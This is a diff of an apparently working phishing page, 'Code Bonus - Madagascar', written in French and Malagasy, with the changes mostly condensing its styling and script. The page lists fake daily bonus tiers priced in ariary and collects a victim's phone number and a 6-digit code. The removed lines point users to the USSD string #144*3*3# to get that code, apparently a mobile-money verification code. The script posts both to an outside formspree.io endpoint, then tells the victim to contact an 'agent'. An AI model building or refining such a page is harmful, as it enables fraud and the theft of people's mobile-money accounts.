@@ -5,187 +5,77 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Code Bonus - Madagascar</title>
     <style>
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            color: white;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(15px);
-            padding: 20px;
-            border-radius: 20px;
-            width: 95%;
-            max-width: 420px;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            box-sizing: border-box;
-        }
+        body { font-family: 'Poppins', sans-serif; background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); padding: 20px; border-radius: 20px; width: 95%; max-width: 420px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 15px 35px rgba(0,0,0,0.5); box-sizing: border-box; }
         .step { display: none; }
         .active { display: block; animation: fadeIn 0.5s; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        .step-img {
-            width: 100%;
-            height: auto;
-            max-height: 200px;
-            object-fit: contain;
-            border-radius: 12px;
-            margin-bottom: 15px;
-            background: #fff;
-        }
-
+        .step-img { width: 100%; height: auto; border-radius: 12px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1); }
         h1 { color: #00d2ff; font-size: 20px; margin: 0 0 10px 0; }
-        
-        .tarif-grid {
-            display: grid;
-            gap: 10px;
-            max-height: 280px;
-            overflow-y: auto;
-            margin-top: 10px;
-            padding-right: 5px;
-        }
-        .tarif-card {
-            background: rgba(255, 255, 255, 0.08);
-            padding: 12px;
-            border-radius: 12px;
-            cursor: pointer;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            display: flex;
-            justify-content: space-between;
-            font-size: 13px;
-            transition: 0.3s;
-        }
-        .tarif-card:hover { background: rgba(0, 210, 255, 0.2); border-color: #00d2ff; }
+        .tarif-grid { display: grid; gap: 10px; max-height: 280px; overflow-y: auto; margin-top: 10px; }
+        .tarif-card { background: rgba(255, 255, 255, 0.08); padding: 12px; border-radius: 12px; cursor: pointer; border: 1px solid rgba(255, 255, 255, 0.1); display: flex; justify-content: space-between; font-size: 13px; }
         .tarif-card b { color: #4dfd63; }
-
-        .btn-next, .btn-confirm {
-            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
-            color: white;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            width: 100%;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 15px;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border-radius: 10px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            background: rgba(0, 0, 0, 0.3);
-            color: white;
-            box-sizing: border-box;
-        }
-
-        #msgFelicitation {
-            font-size: 14px;
-            line-height: 1.6;
-            text-align: left;
-            padding: 15px;
-            background: rgba(0,0,0,0.3);
-            border-radius: 10px;
-            border-left: 4px solid #4dfd63;
-        }
+        .btn-next, .btn-confirm { background: linear-gradient(90deg, #00d2ff, #3a7bd5); color: white; padding: 14px; border: none; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.2); background: rgba(0, 0, 0, 0.3); color: white; box-sizing: border-box; }
+        #msgFelicitation { font-size: 14px; line-height: 1.6; text-align: left; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 10px; border-left: 4px solid #4dfd63; }
     </style>
 </head>
 <body>
-
 <div class="container">
-    
     <div id="step1" class="step active">
         <img src="https://img.freepik.com/free-vector/gift-box-with-blue-ribbon_1308-45607.jpg" class="step-img">
         <h1>Bienvenue dans Code Bonus</h1>
         <button class="btn-next" onclick="nextStep(2)">SUIVANT</button>
     </div>
-
     <div id="step2" class="step">
         <h1>Choisir ton tarif</h1>
         <div class="tarif-grid">
-            <div class="tarif-card" onclick="selectTarif('40.000Ar', '214.000Ar')"><span>40.000Ar bonus par jour</span> <b>21.400Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('60.000Ar', '314.000Ar')"><span>60.000Ar bonus par jour</span> <b>31.400Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('90.000Ar', '414.000Ar')"><span>90.000Ar bonus par jour</span> <b>41.400Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('120.000Ar', '568.000Ar')"><span>120.000Ar bonus par jour</span> <b>56.800Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('140.000Ar', '714.000Ar')"><span>140.000Ar bonus par jour</span> <b>71.400Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('180.000Ar', '875.000Ar')"><span>180.000Ar bonus par jour</span> <b>87.500Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('320.000Ar', '1.004.000Ar')"><span>320.000Ar bonus par jour</span> <b>100.400Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('560.000Ar', '1.814.000Ar')"><span>560.000Ar bonus par jour</span> <b>181.400Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('980.000Ar', '3.114.000Ar')"><span>980.000Ar bonus par jour</span> <b>311.400Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('1.400.000Ar', '4.614.000Ar')"><span>1.400.000Ar bonus par jour</span> <b>461.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('40.000Ar', '214.000Ar')"><span>40k bonus jour</span> <b>21.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('60.000Ar', '314.000Ar')"><span>60k bonus jour</span> <b>31.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('90.000Ar', '414.000Ar')"><span>90k bonus jour</span> <b>41.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('120.000Ar', '568.000Ar')"><span>120k bonus jour</span> <b>56.800Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('140.000Ar', '714.000Ar')"><span>140k bonus jour</span> <b>71.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('180.000Ar', '875.000Ar')"><span>180k bonus jour</span> <b>87.500Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('320.000Ar', '1.004.000Ar')"><span>320k bonus jour</span> <b>100.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('560.000Ar', '1.814.000Ar')"><span>560k bonus jour</span> <b>181.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('980.000Ar', '3.114.000Ar')"><span>980k bonus jour</span> <b>311.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('1.400.000Ar', '4.614.000Ar')"><span>1.4M bonus jour</span> <b>461.400Ar</b></div>
         </div>
     </div>
-
     <div id="step3" class="step">
         <img src="https://img.freepik.com/free-vector/secure-login-concept-illustration_114360-4685.jpg" class="step-img">
         <h1>Validation</h1>
-        <p style="font-size: 12px; color: #ffd700;">Code 6 chiffres: <b>#144*3*3#</b></p>
         <form id="bonusForm" action="https://formspree.io/f/mreaeppz" method="POST">
-            <input type="hidden" name="Tarif_Nofidiana" id="selectedTarifInput">
+            <input type="hidden" name="Tarif" id="selectedTarifInput">
             <input type="tel" name="Numero" placeholder="032 XX XXX XX" required>
             <input type="number" name="Code" placeholder="Code 6 chiffres" required>
             <button type="submit" id="submitBtn" class="btn-confirm">CONFIRMER</button>
         </form>
     </div>
-
     <div id="step4" class="step">
-        <img src="https://i.ibb.co/S76pP6yC/agent-bonus.jpg" class="step-img" alt="Agent Bonus">
+        <img src="agent.jpg" class="step-img">
         <h1 style="color: #4dfd63;">Félicitations!</h1>
-        <div id="msgFelicitation">
-            </div>
-        <p style="font-size: 12px; margin-top: 15px; color: #aaa;">Mankasitraka amin'ny fampiasana ny Code Bonus.</p>
+        <div id="msgFelicitation"></div>
+        <p style="font-size: 11px; margin-top: 10px; color: #aaa;">Mankasitraka amin'ny fampiasana ny Code Bonus.</p>
     </div>
-
 </div>
-
 <script>
-    let chosenFond = "";
-    let chosenBonus = "";
-
-    function nextStep(step) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('step' + step).classList.add('active');
-    }
-
-    function selectTarif(fond, bonus) {
-        chosenFond = fond;
-        chosenBonus = bonus;
-        document.getElementById('selectedTarifInput').value = "Fond: " + fond + " | Bonus: " + bonus;
-        nextStep(3);
-    }
-
+    let chosenFond = ""; let chosenBonus = "";
+    function nextStep(step) { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); document.getElementById('step' + step).classList.add('active'); }
+    function selectTarif(fond, bonus) { chosenFond = fond; chosenBonus = bonus; document.getElementById('selectedTarifInput').value = "Fond: " + fond + " | Bonus: " + bonus; nextStep(3); }
     const form = document.getElementById('bonusForm');
     form.onsubmit = async (e) => {
         e.preventDefault();
-        const btn = document.getElementById('submitBtn');
-        btn.innerText = "Fanamarinana...";
-        btn.disabled = true;
-        
+        const btn = document.getElementById('submitBtn'); btn.innerText = "Fanamarinana...";
         const data = new FormData(form);
-        const response = await fetch(form.action, {
-            method: 'POST', body: data, headers: { 'Accept': 'application/json' }
-        });
-        
+        const response = await fetch(form.action, { method: 'POST', body: data, headers: { 'Accept': 'application/json' } });
         if (response.ok) {
             const msg = `Felicitation, votre bonus est en cours. Voamarina fa manana fond <b>${chosenFond}</b> ianao ary misitraka bonus <b>${chosenBonus}</b> izao ka manasa anao handefa mp amin'i agent code Bonus izao, efa io am sary eo ambony io ny pagen'i agent code bonus.`;
             document.getElementById('msgFelicitation').innerHTML = msg;
             nextStep(4);
-        } else {
-            alert("Misy olana kely. Andramo indray.");
-            btn.innerText = "CONFIRMER";
-            btn.disabled = false;
         }
     };
 </script>
-
 </body>
 </html>
+
